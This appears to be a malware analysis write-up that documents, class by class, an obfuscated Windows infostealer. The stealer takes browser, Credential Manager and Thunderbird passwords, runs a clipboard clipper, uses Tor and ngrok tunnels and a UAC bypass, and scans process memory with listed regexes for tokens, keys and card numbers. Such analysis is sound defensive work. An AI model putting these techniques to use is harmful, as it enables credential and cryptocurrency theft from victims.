rkZgwP — ZIP FILE CREATOR / EXTRACTOR
Summary
Method	Purpose
jvX0	Extract ZIP to directory, optionally delete source
rM	Create ZIP from file/directory, return bytes
How It's Used
Context	Method	Purpose
Download plink.exe	jvX0	Extract downloaded ZIP to Starlabs folder
C2 command ZIP_FILE	rM	Compress file for exfiltration
ngrok/tor download	jvX0	Extract tunnel tools

s4x — BROWSER CREDENTIAL STEALER (DPAPI Decrypt)
What It Steals

This accesses the Windows Credential Manager (also known as Windows Vault) to extract:

    Saved website passwords (from Chrome, Edge, IE)

    Username for each credential

    Encrypted password → decrypted via DPAPI

    URL/Application name the credential belongs to
    Encrypted Values in Registry
    Registry Value	Decrypted Content
    "encrypted"	Encrypted credential blob
    "entropy"	Entropy/IV for DPAPI
    "password"	Encrypted password
    "Username"	Username (plain Unicode)
    Summary
    Method	Purpose
    boi	Steal browser saved credentials from Windows Credential Manager, decrypt via DPAPI

sRK5IN — CLIPBOARD MONITOR + CLIPPER LOOP
Method	Purpose
iZs	Start clipboard monitor — checks every 600ms for new text, sends to clipper

tPoKW — WILDCARD PATTERN MATCHER
Supported Wildcards
Wildcard	Matches
?	Any single character
*	Zero or more characters
Examples
csharp

tPoKW::kx("*.txt", "document.txt")       // true
tPoKW::kx("file?.dat", "file1.dat")      // true
tPoKW::kx("file?.dat", "file12.dat")     // false
tPoKW::kx("*.exe", "malware.dll")        // false
tPoKW::kx("Chrome*", "Chrome_Default")   // true

viT — TOR HIDDEN SERVICE MANAGER
Summary
Method	Purpose
zAQ	Download Tor Expert Bundle from official Tor Project
jqVKWL	Create torrc config with Hidden Service settings
abaX	Download + extract Tor to working directory
zRla	Kill Tor process
m1	Start Tor Hidden Service → return .onion address
The Four Tunnel Methods (Final Summary)
Class	Method	Tunnel Type	Download
viT	Tor Hidden Service	.onion address	torproject.org
nBmmX8	Serveo.net	serveo.net URL	the.earth.li (plink.exe)
k8OCdS	ngrok	ngrok.io URL	ngrok CDN
lN	Tor Browser	Tor SOCKS5	System-installed

w8RnS — WINDOWS CREDENTIAL MANAGER STEALER
What It Steals

This accesses the Windows Credential Manager (Control Panel → Credential Manager) which stores:

    Web credentials (saved by Chrome, Edge, IE)

    Windows credentials (network shares, RDP, VPN)

    Generic credentials (applications)

    Certificate-based credentials

Each entry returns:
text

<URL/Target>$#%<Username>$#%<Password>|||
Output Format
text

https://outlook.office365.com$#%john@company.com$#%MyP@ssw0rd|||
TERMSRV/192.168.1.100$#%Administrator$#%Admin123!|||
https://github.com$#%dev_user$#%gh_token_abc|||

Summary
Method	Purpose
CredEnumerate	Win32 API to list all saved credentials
vcTrSN	Enumerate all Windows credentials
mX3c	Format credential — extract TargetName, UserName, Password
Relationship with s4x
Class	Source	What It Steals
s4x::boi	Registry (Windows Vault)	Browser-saved passwords
w8RnS::vcTrSN	CredEnumerate API	All Windows credentials (web, network, apps)

wv6 — Commands Configuration Root
Summary
wv6 is simply the root container for the array of kAXa7 steal commands. It wraps them for XML serialization/deserialization. 

xEdACX — Custom ZIP Archive Engine
┌─────────────────────────────────┐
│   Local File Header #1          │ ← tZxu() writes this
│   ├── Signature (0x04034b50)    │
│   ├── Compression Method        │
│   ├── File Size (uncompressed)  │
│   └── Filename                  │
├─────────────────────────────────┤
│   File Data (compressed/raw)    │ ← y1() writes this
├─────────────────────────────────┤
│   Data Descriptor               │ ← zpTsA() writes CRC32, sizes
├─────────────────────────────────┤
│   ... (more files) ...          │
├─────────────────────────────────┤
│   Central Directory             │ ← oiI() writes this
│   ├── Signature (0x02014b50)    │
│   ├── Summary of ALL files      │
│   └── Metadata/offsets          │
├─────────────────────────────────┤
│   End of Central Directory      │ ← ftlY7R() writes this
│   ├── Signature (0x06054b50)    │
│   ├── Offset to Central Dir     │
│   └── ZIP comment               │
└─────────────────────────────────┘
Key Methods
Method	Purpose
aVpcO / jr / hRWL	Static constructors - open/create ZIP files
wcUPlX	Add a single file to the archive
pMn	Recursively add an entire directory tree
jj2	Finalize - write Central Directory + close archive
pA5P	Read - parse existing ZIP and build file list
jUEMG / oIr	Extract - decompress a file to a stream
atpdt	Extract file and restore timestamps on disk
qzdi	🔥 MODIFY - delete files from ZIP by rebuilding it
CRC32 Implementation: Custom lookup table built in .cctor (static constructor)

    Uses polynomial 0xEDB88320 (standard CRC-32)

ZIP64 Support: Handles files >4GB via 0xFFFF flags and extra data fields

NTFS Timestamps: Stores CreationTime, AccessTime, ModifyTime in extra fields (tag 0x000A)

UTF-8 Encoding: Supports EncodeUTF8 flag (bit 11 in general purpose flag)

Deflate Compression: Uses System.IO.Compression.DeflateStream

y03WP — UAC Bypass via Registry + MSI Installer
This class contains a single static method yL(string yg4) that performs a UAC (User Account Control) bypass by abusing the Windows Registry and launching an MSI installer.

yfei0C — Thunderbird Email & Password Stealer
This class steals email accounts, passwords, and stored credentials from Mozilla Thunderbird email client by reading its saved login data from the Windows Registry.
Registry Paths Enumerated

From the obfuscated strings in .cctor, decoded registry paths:
Index	Registry Path
0	Software\Clients\Mail\Mozilla Thunderbird
1	Software\Clients\Mail\Thunderbird
2	Software\Mozilla\Mozilla Thunderbird
3	Software\Thunderbird
4	Software\Mozilla Thunderbird
5	Software\Microsoft\Windows Messaging Subsystem\Profiles
6	Software\Microsoft\Windows Messaging Subsystem\Profiles
7	Software\Microsoft\Windows Messaging Subsystem\Profiles
8	Software\Microsoft\Windows Messaging Subsystem\Profiles
9	Software\Microsoft\Windows Messaging Subsystem\Profiles

yFzr — Application Settings Wrapper (Autogenerated)

ypzCTr — Process Memory Scanner / Credential Dumper
This class performs process memory scanning to extract sensitive information (credentials, tokens, etc.) from running processes by reading their memory and searching for patterns using regex.
Win32 API Constants
Constant	Value	Purpose
aumwEI	16	PROCESS_VM_READ (Read memory)
dbL	1024	PAGE_READWRITE (Memory page protection)
aApo	4096	MEM_COMMIT (Memory state - committed)
rQFfd	4	PAGE_READWRITE (Memory page protection)
This class is a generic memory scanner that can be used to steal:
Target	Regex Pattern	What It Finds
Passwords	"password.*=.*"	Password strings in memory
Tokens	"[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+"	JWT tokens
API Keys	"[a-zA-Z0-9]{32,}"	API keys (32+ chars)
Credit Cards	"\\d{4}-\\d{4}-\\d{4}-\\d{4}"	Credit card numbers
Email Addresses	"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"	Email addresses
Discord Tokens	"[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9]{27}"	Discord tokens

zB3 — Key-Value Pair for XML Serialization
This is a serializable key-value pair structure used for XML configuration storage. It represents a single setting or parameter with a key and value.
Property	XML Attribute	Field	Getter/Setter
_uctqqQJYEA941	"key"	rMzw	get__uctqqQJYEA941 / set__uctqqQJYEA941
_P7mcPFxuwVuWU	"value"	tEsT2M	get__P7mcPFxuwVuWU / set__P7mcPFxuwVuWU

zo_lg0 — System Fingerprinting via WMI
What It Is
This class collects system identification information using Windows Management Instrumentation (WMI) to generate a unique device fingerprint for the infected machine.


zR — Crypto Wallet Address Validator / Network Identifier
What It Is
This class maps cryptocurrency wallet addresses to their respective networks/chains using regex patterns. It identifies which blockchain a wallet address belongs to by matching it against known address formats.
Dictionary Mapping (.cctor)
Coin	Ticker	Address Pattern (Decoded)
Litecoin	ltc	^[LM][a-km-zA-HJ-NP-Z1-9]{26,33}$
Ripple	xrp	^r[0-9a-zA-Z]{24,34}$
Binance Coin	bnb	^bnb1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{39}$
Solana	sol	^[1-9A-HJ-NP-Za-km-z]{32,44}$
Algorand	alg	^[A-Z0-9]{58}$
Monero	xmr	^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$
Bitcoin	btc	^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$
Bitcoin Cash	bch	^(bitcoincash:)?[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{42}$
Zcash	zec	^t1[0-9a-zA-Z]{33}$
Dash	dash	^X[1-9A-HJ-NP-Za-km-z]{33}$
NEO	neo	^A[0-9a-zA-Z]{33}$
Stellar	xlm	^G[0-9a-zA-Z]{55}$
Ethereum	eth	^0x[a-fA-F0-9]{40}$
Dogecoin	doge	^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$
TRON	trx	^T[0-9a-zA-Z]{33}$
